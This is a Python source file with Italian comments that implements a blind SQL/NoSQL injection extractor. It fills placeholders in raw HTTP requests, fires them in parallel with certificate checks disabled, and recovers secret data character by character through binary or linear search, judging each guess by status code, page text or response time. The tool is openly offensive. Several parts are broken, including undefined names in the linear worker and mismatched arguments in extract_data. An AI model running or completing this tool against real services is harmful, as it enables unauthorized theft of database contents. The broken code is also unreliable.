import asyncio
import time
import string
import httpx

# Char to be copy-pasted for placeholders in attacks: §

def parse_raw_request(raw_text: str):
    """Build request (url, headers e body) from RAW string."""
    normalized = raw_text.replace("\r\n", "\n").replace("\r", "\n")
    header_text, separator, body = normalized.partition("\n\n")

    if not separator:
        # raise ValueError("Raw request is missing the blank line separating headers and body.")
        body = ''

    lines = header_text.splitlines()
    method, path, _ = lines[0].strip().split()

    headers = {}
    for line in lines[1:]:
        if not line.strip():
            continue
        key, value = line.split(":", 1)
        if key.strip().lower() != "content-length":
            headers[key.strip()] = value.strip()

    host = headers.get("Host", "")
    url = f"https://{host}{path}"

    body = body.replace("\r\n", "\n").replace("\n", "\r\n")
    return  {
                'method': method,
                'url': url,
                'headers': headers,
                'body': body
            }

# ==========================================
# 1. PARSER HELPER & REQUEST PREPARATION
# ==========================================

def build_request(raw_template: str, **kwargs) -> dict:
    """
    Sostituisce i placeholder direttamente sulla stringa raw originale,
    poi ne effettua il parsing.
    """
    # 1. Sostituzione diretta su tutta la richiesta grezza
    # formatted_raw = raw_template.format(*kwargs)
    for name, value in kwargs.items():
        raw_template = raw_template.replace(f'§{name}§', str(value))
    
    # 2. Parsing della richiesta già formattata
    return parse_raw_request(raw_template)

# ==========================================
# 2. RUNNER ATOMICO (Singola Chiamata)
# ==========================================

async def send_single_request(
    raw_template: str,
    client: httpx.AsyncClient = None,
    semaphore: asyncio.Semaphore = None,
    **kwargs
) -> dict:
    """
    Compone, parsa ed esegue una singola richiesta HTTP.
    """
    parsed_req = build_request(raw_template, **kwargs)
    
    close_client = False
    if client is None:
        client = httpx.AsyncClient(verify=False, timeout=15.0)
        close_client = True

    start_time = time.perf_counter()
    try:
        req_kwargs = {
            "method": parsed_req["method"],
            "url": parsed_req["url"],
            "headers": parsed_req.get("headers"),
            "content": parsed_req.get("body")
        }

        if semaphore:
            async with semaphore:
                response = await client.request(**req_kwargs)
        else:
            response = await client.request(**req_kwargs)
            
        elapsed_seconds = time.perf_counter() - start_time
        
        return {
            "status_code": response.status_code,
            "elapsed": elapsed_seconds,
            "headers": dict(response.headers),
            "text": response.text,
            "content": response.content,
            "response_obj": response
        }
    finally:
        if close_client:
            await client.aclose()

# ==========================================
# 3. EVALUATOR (Usa l'output di send_single_request)
# ==========================================

def evaluate_response(res_data: dict, true_condition: dict) -> bool:
    """
    Verifica la veridicità basandosi sul dizionario restituito da send_single_request.
    """
    if "status_code" in true_condition and res_data["status_code"] != true_condition["status_code"]:
        return False
        
    if "contains_text" in true_condition and true_condition["contains_text"] not in res_data["text"]:
        return False
        
    if "min_time" in true_condition and res_data["elapsed"] < true_condition["min_time"]:
        return False
        
    return True

# ==========================================
# 4A. WORKER ED ESTRAZIONE PARALLELA - BINARIA
# ==========================================

async def _extract_char_binary(
    raw_template: str, 
    pos: int, 
    charset: str, 
    true_condition: dict, 
    client: httpx.AsyncClient, 
    semaphore: asyncio.Semaphore
) -> str:
    low = 0
    high = len(charset) - 1

    while low <= high:
        mid = (low + high) // 2
        char_to_test = charset[mid]
        payload_val = f"> '{char_to_test}'" 
        
        res_data = await send_single_request(
            raw_template, pos=pos, payload_val=payload_val, client=client, semaphore=semaphore
        )
            
        if evaluate_response(res_data, true_condition):
            low = mid + 1
        else:
            high = mid - 1

    if 0 <= low < len(charset):
        return charset[low]
    return "?"

# ==========================================
# 4B. WORKER ED ESTRAZIONE PARALLELA - LINEARE
# ==========================================

async def _extract_char_linear(parsed_req, pos: int, charset: str, true_condition: dict, client: httpx.AsyncClient, semaphore: asyncio.Semaphore) -> str:
    """
    Ricerca lineare per NoSQL o scenari senza operatori di confronto (> / <).
    {payload} viene sostituito direttamente col singolo carattere.
    """
    for char in charset:
        req_kwargs = prepare_httpx_request(parsed_req, pos, char)
        
        async with semaphore:
            res_data = await send_single_request(
                raw_template, pos=pos, payload_val=payload_val, client=client, semaphore=semaphore
            )
            
        if evaluate_response(res, true_condition):
            return char
            
    return "?"

async def extract_data(
    parsed_req: dict, 
    length: int, 
    true_condition: dict, 
    charset: str = string.ascii_letters + string.digits + "_-!@#$",
    strategy: str = "binary", 
    max_concurrency: int = 15
) -> str:
    semaphore = asyncio.Semaphore(max_concurrency)
    
    async with httpx.AsyncClient(verify=False, timeout=10.0) as client:
        tasks = []
        
        for pos in range(1, length + 1):
            if strategy == "binary":
                task = _extract_char_binary(parsed_req, pos, sorted(charset), true_condition, client, semaphore)
            else:
                task = _extract_char_linear(parsed_req, pos, charset, true_condition, client, semaphore)
            tasks.append(task)
            
        # Esegue tutte le posizioni in parallelo
        results = await asyncio.gather(*tasks)
        return "".join(results)